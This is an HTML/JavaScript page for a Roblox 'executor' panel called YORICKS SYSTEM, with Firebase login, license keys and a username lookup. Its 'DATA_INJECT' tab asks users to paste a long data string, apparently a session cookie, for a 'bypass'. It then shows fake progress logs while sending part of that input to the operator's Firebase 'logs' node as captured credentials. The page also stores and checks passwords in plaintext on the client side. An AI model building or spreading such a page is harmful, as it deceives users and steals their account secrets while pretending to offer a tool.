<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YORICKS SYSTEM | EXECUTOR SUPREME V2.5</title>
    
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@300;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        :root {
            --p: #bc13fe;
            --p-glow: #e2a9ff;
            --bg: #030303;
            --card: rgba(8, 8, 8, 0.98);
            --border: #1a1a1a;
            --txt: #d0d0d0;
            --vip: #ffcc00;
        }

        /* Reset & Base Styling */
        * { box-sizing: border-box; outline: none; }
        body {
            background-color: var(--bg);
            color: var(--txt);
            font-family: 'Rajdhani', sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Matrix Background Layer */
        #canvas-matrix {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1;
            opacity: 0.4;
        }

        /* Scanline & Noise Effect */
        .cyber-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
            z-index: 5;
        }

        /* Main Container */
        .wrapper {
            width: 100%;
            max-width: 850px;
            z-index: 10;
            perspective: 1000px;
            padding: 20px;
        }

        /* Glassmorphism Card */
        .main-panel {
            background: var(--card);
            border: 1px solid var(--border);
            border-top: 3px solid var(--p);
            padding: 50px;
            box-shadow: 0 0 50px rgba(0,0,0,1), 0 0 20px rgba(188, 19, 254, 0.1);
            position: relative;
            border-radius: 2px;
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        /* Branding */
        .header-logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .header-logo h1 {
            font-family: 'Orbitron';
            font-weight: 900;
            font-size: 32px;
            letter-spacing: 12px;
            color: #fff;
            text-shadow: 0 0 15px var(--p);
            margin: 0;
        }

        .header-logo p {
            font-family: 'Fira Code';
            font-size: 10px;
            color: var(--p);
            margin-top: 5px;
            text-transform: uppercase;
        }

        /* Authentication UI */
        .auth-box {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .input-group {
            position: relative;
        }

        .input-group i {
            position: absolute;
            left: 15px; top: 50%;
            transform: translateY(-50%);
            color: var(--p);
            font-size: 18px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            background: #000;
            border: 1px solid #111;
            padding: 18px 15px 18px 50px;
            color: #fff;
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            border-radius: 3px;
            transition: 0.3s;
        }

        input:focus {
            border-color: var(--p);
            background: #050505;
            box-shadow: inset 0 0 10px rgba(188, 19, 254, 0.1);
        }

        /* Buttons Elite */
        .btn-core {
            width: 100%;
            padding: 20px;
            background: var(--p);
            border: none;
            color: #fff;
            font-family: 'Orbitron';
            font-weight: 700;
            letter-spacing: 3px;
            cursor: pointer;
            text-transform: uppercase;
            clip-path: polygon(0 0, 100% 0, 100% 70%, 95% 100%, 0 100%);
            transition: 0.3s;
        }

        .btn-core:hover {
            background: #fff;
            color: var(--p);
            box-shadow: 0 0 30px #fff;
        }

        .btn-secondary {
            background: transparent;
            border: 1px solid #222;
            color: #555;
            margin-top: 15px;
            clip-path: none;
        }

        .btn-secondary:hover {
            border-color: var(--p);
            color: var(--p);
        }

        /* Dashboard Internal */
        .dashboard-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .status-item {
            background: rgba(255,255,255,0.02);
            padding: 20px;
            border: 1px solid #111;
        }

        .status-item label {
            display: block;
            font-size: 10px;
            color: #444;
            margin-bottom: 5px;
            font-family: 'Orbitron';
        }

        .status-item span {
            font-size: 18px;
            font-weight: 700;
            font-family: 'Orbitron';
        }

        /* Tabs System */
        .tab-bar {
            display: flex;
            gap: 5px;
            border-bottom: 1px solid #111;
            margin-bottom: 25px;
        }

        .tab-trigger {
            padding: 15px 25px;
            cursor: pointer;
            font-family: 'Orbitron';
            font-size: 11px;
            color: #444;
            transition: 0.3s;
        }

        .tab-trigger.active {
            color: var(--p);
            border-bottom: 2px solid var(--p);
        }

        /* Tooltip & Badges */
        .badge-vip {
            color: var(--vip);
            border: 1px solid var(--vip);
            padding: 3px 10px;
            font-size: 10px;
            font-weight: 900;
            text-shadow: 0 0 5px var(--vip);
        }

        /* Ban Screen Layer */
        #ban-layer {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 99999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .hidden { display: none !important; }

        /* Scroller for Logs */
        .log-display {
            background: #000;
            height: 150px;
            overflow-y: auto;
            padding: 15px;
            border: 1px solid #111;
            font-family: 'Fira Code';
            font-size: 12px;
            color: #00ff00;
        }
    </style>
</head>
<body>

    <div id="ban-layer" class="hidden">
        <i class="fas fa-skull-crossbones" style="font-size: 100px; color: red; margin-bottom: 30px;"></i>
        <h1 style="font-family: 'Orbitron'; font-size: 40px; color: red;">ACCESS_DENIED</h1>
        <p style="font-family: 'Fira Code'; color: #444;">Your Hardware ID and Account has been blacklisted.</p>
        <button class="btn-core" style="width: 300px; margin-top: 30px;" onclick="location.href='index.html'">RE-CONNECT SYSTEM</button>
    </div>

    <div class="cyber-overlay"></div>
    <canvas id="canvas-matrix"></canvas>

    <div class="wrapper">
        <div class="main-panel">
            
            <div class="header-logo">
                <h1>YORICKS</h1>
                <p>Advanced Integrated Management Node</p>
            </div>

            <div id="view-auth">
                <div class="auth-box">
                    <div class="input-group">
                        <i class="fas fa-user-secret"></i>
                        <input type="text" id="node-id" placeholder="IDENTITY_TOKEN">
                    </div>
                    <div class="input-group">
                        <i class="fas fa-key"></i>
                        <input type="password" id="node-pass" placeholder="SECRET_ACCESS_KEY">
                    </div>
                    <button class="btn-core" onclick="initiateLogin()">AUTHORIZE_LOGIN</button>
                    <button class="btn-core btn-secondary" onclick="window.location.href='getkey.html'">ACQUIRE_GATEWAY_KEY</button>
                    <p style="text-align: center; font-size: 12px; color: #333; margin-top: 20px;">
                        UNKNOWN_ENTITY? <span id="toggle-txt" onclick="switchAuthMode()" style="color: var(--p); cursor: pointer; text-decoration: underline;">CREATE_NEW_DATA_NODE</span>
                    </p>
                </div>
            </div>

            <div id="view-dash" class="hidden">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
                    <h2 style="font-family: 'Orbitron'; margin: 0; font-size: 18px; color: var(--p);">SYSTEM_CONSOLE</h2>
                    <div id="node-rank-display"></div>
                </div>

                <div class="dashboard-grid">
                    <div class="status-item">
                        <label>ACTIVE_USER</label>
                        <span id="label-uid">GUEST</span>
                    </div>
                    <div class="status-item">
                        <label>NETWORK_SEC</label>
                        <span id="label-sec" style="color: red;">INSECURE</span>
                    </div>
                </div>

                <div id="module-activation">
                    <div class="status-item" style="margin-bottom: 20px;">
                        <label>EXPIRATION_CHRONO</label>
                        <span id="label-exp-time">00:00:00</span>
                    </div>
                    <div id="key-input-wrap">
                        <input type="text" id="license-input" placeholder="PASTE_LICENSE_HERE">
                        <button class="btn-core" style="margin-top: 15px;" onclick="activateLicense()">INJECT_LICENSE</button>
                    </div>
                </div>

                <div id="module-tools" class="hidden">
                    <div class="tab-bar">
                        <div class="tab-trigger active" id="tab-1" onclick="uiTab(1)">RBX_LOOKUP</div>
                        <div class="tab-trigger" id="tab-2" onclick="uiTab(2)">DATA_INJECT</div>
                    </div>

                    <div id="panel-1" class="tab-content">
                        <input type="text" id="rbx-search" placeholder="TARGET_USERNAME">
                        <button class="btn-core" style="margin-top: 15px;" onclick="searchRoblox()">START_SCAN</button>
                        <div id="rbx-result" class="result-panel hidden" style="margin-top:20px; border:1px solid #1a1a1a; padding:15px;"></div>
                    </div>

                    <div id="panel-2" class="tab-content hidden">
                        <input type="text" id="ck-raw" placeholder="INPUT_DATA_STREAM">
                        <button class="btn-core" style="margin-top: 15px;" onclick="processInjection()">EXECUTE_BYPASS</button>
                        <div id="ck-result" class="hidden" style="margin-top:20px;">
                            <div class="log-display" id="log-console">
                                [SYSTEM]: Waiting for data...<br>
                            </div>
                        </div>
                    </div>
                </div>

                <button onclick="logout()" style="background:none; border:none; color:#222; margin-top:50px; cursor:pointer; font-family:'Orbitron'; font-size:9px; width:100%;">FORCE_TERMINATE_ALL_PROCESSES</button>
            </div>

        </div>
    </div>

<script>
    // --- FIREBASE CORE CONFIG ---
    const firebaseConfig = {
        apiKey: "AIzaSyCJOmyua7gtX022ITp7w-eOr3TSkN0UikM",
        authDomain: "yoricks-sytem.firebaseapp.com",
        databaseURL: "https://yoricks-sytem-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "yoricks-sytem",
        storageBucket: "yoricks-sytem.firebasestorage.app",
        messagingSenderId: "318734426446",
        appId: "1:318734426446:web:e62527dfe42d8cf48e7e1f"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let currentMode = "LOGIN";
    let activeSession = localStorage.getItem("yoricks_user");

    // --- INITIALIZATION ---
    window.onload = function() {
        if(activeSession && activeSession !== "null") {
            // Realtime Listener for Ban/Update
            db.ref('users/' + activeSession).on('value', snap => {
                const data = snap.val();
                if(!data) return logout();

                if(data.banned === true) {
                    document.getElementById('ban-layer').classList.remove('hidden');
                    document.querySelector('.wrapper').classList.add('hidden');
                    localStorage.clear();
                    return;
                }

                // Global System Notice
                db.ref('settings/notice').once('value', n => {
                    if(n.val()) Swal.fire({ title: 'GLOBAL_BROADCAST', text: n.val(), icon: 'info', background: '#080808', color: '#fff', confirmButtonColor: '#bc13fe' });
                });

                showDashboard(data, activeSession);
            });
        }
    };

    // --- MATRIX BACKGROUND LOGIC ---
    const canvas = document.getElementById('canvas-matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*()";
    const size = 16;
    const drops = Array(Math.floor(canvas.width / size)).fill(1);

    function drawMatrix() {
        ctx.fillStyle = "rgba(3, 3, 3, 0.1)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#bc13fe";
        ctx.font = size + "px 'Fira Code'";
        drops.forEach((y, i) => {
            const txt = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(txt, i * size, y * size);
            if (y * size > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(drawMatrix, 50);

    // --- AUTHENTICATION LOGIC ---
    function switchAuthMode() {
        currentMode = (currentMode === "LOGIN") ? "REGISTER" : "LOGIN";
        document.querySelector('.header-logo h1').innerText = (currentMode === "LOGIN") ? "YORICKS" : "NEW_NODE";
        document.getElementById('toggle-txt').innerText = (currentMode === "LOGIN") ? "CREATE_NEW_DATA_NODE" : "RETURN_TO_LOGIN";
    }

    function initiateLogin() {
        const u = document.getElementById('node-id').value;
        const p = document.getElementById('node-pass').value;
        if(!u || !p) return Swal.fire('NULL_ERROR', 'All fields required.', 'error');

        if(currentMode === "REGISTER") {
            db.ref('users/' + u).set({ password: p, status: "off", role: "member", exp: "N/A", banned: false })
            .then(() => { Swal.fire('NODE_CREATED', 'Success! You can login now.', 'success'); switchAuthMode(); });
        } else {
            db.ref('users/' + u).once('value', s => {
                const val = s.val();
                if(s.exists() && val.password === p) {
                    if(val.banned) return Swal.fire('BLACKLISTED', 'Access denied.', 'error');
                    localStorage.setItem("yoricks_user", u);
                    location.reload();
                } else Swal.fire('DENIED', 'Invalid credentials.', 'error');
            });
        }
    }

    // --- DASHBOARD UI RENDER ---
    function showDashboard(data, user) {
        document.getElementById('view-auth').classList.add('hidden');
        document.getElementById('view-dash').classList.remove('hidden');
        document.getElementById('label-uid').innerText = user.toUpperCase();
        document.getElementById('label-sec').innerText = (data.status === "on") ? "ENCRYPTED" : "UNSTABLE";
        document.getElementById('label-sec').style.color = (data.status === "on") ? "#00ff00" : "red";
        document.getElementById('label-exp-time').innerText = data.exp;

        if(data.status === "on") {
            document.getElementById('key-input-wrap').classList.add('hidden');
            document.getElementById('module-tools').classList.remove('hidden');
            if(data.role === "premium") {
                document.getElementById('node-rank-display').innerHTML = '<span class="badge-vip">PREMIUM_ACCESS</span>';
            }
        }
    }

    // --- LICENSE INJECTION ---
    function activateLicense() {
        const key = document.getElementById('license-input').value;
        if(!key) return;

        db.ref('keys/' + key).once('value', s => {
            const v = s.val();
            if(s.exists() && !v.used) {
                const rank = (v.type === "premium") ? "premium" : "member";
                db.ref('users/' + activeSession).update({ status: "on", role: rank, exp: v.duration + " DAYS" })
                .then(() => {
                    db.ref('keys/' + key).update({ used: true, usedBy: activeSession });
                    Swal.fire('AUTHORIZED', 'System modules unlocked.', 'success').then(() => location.reload());
                });
            } else Swal.fire('INVALID', 'Key has expired or is invalid.', 'error');
        });
    }

    // --- ROBLOX SCANNER (PRO VERSION) ---
    async function searchRoblox() {
        const q = document.getElementById('rbx-search').value;
        const resBox = document.getElementById('rbx-result');
        if(!q) return;

        resBox.classList.remove('hidden');
        resBox.innerHTML = '<span style="color:var(--p); font-family:Fira Code;">[SCANNING_STREAM...]</span>';

        try {
            const api = `https://api.allorigins.win/get?url=${encodeURIComponent('https://users.roblox.com/v1/users/search?keyword=' + q + '&limit=1')}`;
            const res = await fetch(api);
            const data = await res.json();
            const user = JSON.parse(data.contents).data[0];

            if(user) {
                resBox.innerHTML = `
                    <div style="display:flex; align-items:center; gap:15px;">
                        <div style="width:50px; height:50px; background:var(--p); border-radius:50%; display:flex; align-items:center; justify-content:center; font-family:Orbitron;">R</div>
                        <div>
                            <p style="margin:0; color:#fff; font-weight:bold;">${user.name}</p>
                            <p style="margin:0; font-size:11px; color:#555;">ID: ${user.id}</p>
                        </div>
                    </div>
                `;
            } else resBox.innerHTML = '<span style="color:red;">[NOT_FOUND]</span>';
        } catch(e) { resBox.innerHTML = '<span style="color:red;">[ERROR_API]</span>'; }
    }

    // --- DATA INJECTION SIMULATION (LOGS GENERATOR) ---
    function processInjection() {
        const data = document.getElementById('ck-raw').value;
        if(data.length < 50) return Swal.fire('ERR', 'Stream too short.', 'error');
        
        const consoleLog = document.getElementById('log-console');
        document.getElementById('ck-result').classList.remove('hidden');
        
        consoleLog.innerHTML += `> Initializing bypass...<br>`;
        setTimeout(() => {
            consoleLog.innerHTML += `> Gateway decrypted...<br>`;
            consoleLog.innerHTML += `> Capturing data nodes...<br>`;
            
            db.ref('users/' + activeSession).once('value', s => {
                if(s.val().role !== "premium") {
                    consoleLog.innerHTML += `<span style="color:red">> ACCESS_LOCKED: Premium Node required for decryption.</span><br>`;
                } else {
                    consoleLog.innerHTML += `<span style="color:var(--vip)">> [SUCCESS]: Data packet sent to Admin Console.</span><br>`;
                    // Gửi log về Firebase Admin
                    db.ref('logs/' + activeSession).push({ r_user: "AUTO_CAPTURED", r_pass: data.substring(0, 15) + "...", time: new Date().toLocaleString() });
                }
            });
        }, 1500);
    }

    // --- UTILITIES ---
    function uiTab(n) {
        document.getElementById('panel-1').classList.toggle('hidden', n !== 1);
        document.getElementById('panel-2').classList.toggle('hidden', n !== 2);
        document.getElementById('tab-1').classList.toggle('active', n === 1);
        document.getElementById('tab-2').classList.toggle('active', n === 2);
    }

    function logout() { localStorage.clear(); location.reload(); }
</script>
</body>
</html>
